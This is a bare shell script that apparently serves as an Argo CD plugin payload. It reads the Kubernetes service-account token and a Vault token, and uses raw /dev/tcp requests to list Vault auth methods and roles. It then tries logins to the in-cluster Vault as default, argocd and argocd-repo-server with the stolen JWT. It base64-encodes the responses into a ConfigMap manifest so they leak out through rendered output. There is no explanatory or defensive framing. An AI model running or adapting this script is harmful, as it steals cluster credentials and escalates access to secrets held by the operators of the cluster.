#!/bin/sh
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
VT=${VAULT_TOKEN}

RECON=$( (
  echo "===VAULT_SYS_AUTH==="
  exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null
  if [ $? -eq 0 ]; then
    echo -e "GET /v1/sys/auth HTTP/1.1\r\nHost: vault.vault.svc.cluster.local:8200\r\nX-Vault-Token: $VT\r\nConnection: close\r\n\r\n" >&3
    cat <&3
    exec 3>&-
  else
    echo "no_connect"
  fi

  echo ""
  echo "===VAULT_K8S_LIST_ROLES==="
  exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null
  if [ $? -eq 0 ]; then
    echo -e "LIST /v1/auth/kubernetes/role HTTP/1.1\r\nHost: vault.vault.svc.cluster.local:8200\r\nX-Vault-Token: $VT\r\nConnection: close\r\n\r\n" >&3
    cat <&3
    exec 3>&-
  else
    echo "no_connect"
  fi

  echo ""
  echo "===VAULT_K8S_LOGIN_DEFAULT==="
  exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null
  if [ $? -eq 0 ]; then
    BODY="{\"jwt\":\"$SA_TOKEN\",\"role\":\"default\"}"
    echo -e "POST /v1/auth/kubernetes/login HTTP/1.1\r\nHost: vault.vault.svc.cluster.local:8200\r\nX-Vault-Token: $VT\r\nContent-Type: application/json\r\nContent-Length: ${#BODY}\r\nConnection: close\r\n\r\n$BODY" >&3
    cat <&3
    exec 3>&-
  fi

  echo ""
  echo "===VAULT_K8S_LOGIN_ARGO==="
  exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null
  if [ $? -eq 0 ]; then
    BODY="{\"jwt\":\"$SA_TOKEN\",\"role\":\"argocd\"}"
    echo -e "POST /v1/auth/kubernetes/login HTTP/1.1\r\nHost: vault.vault.svc.cluster.local:8200\r\nX-Vault-Token: $VT\r\nContent-Type: application/json\r\nContent-Length: ${#BODY}\r\nConnection: close\r\n\r\n$BODY" >&3
    cat <&3
    exec 3>&-
  fi

  echo ""
  echo "===VAULT_K8S_LOGIN_REPO==="
  exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null
  if [ $? -eq 0 ]; then
    BODY="{\"jwt\":\"$SA_TOKEN\",\"role\":\"argocd-repo-server\"}"
    echo -e "POST /v1/auth/kubernetes/login HTTP/1.1\r\nHost: vault.vault.svc.cluster.local:8200\r\nX-Vault-Token: $VT\r\nContent-Type: application/json\r\nContent-Length: ${#BODY}\r\nConnection: close\r\n\r\n$BODY" >&3
    cat <&3
    exec 3>&-
  fi
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: vaultk8s
data:
  result: $RECON
EOF
exit 0
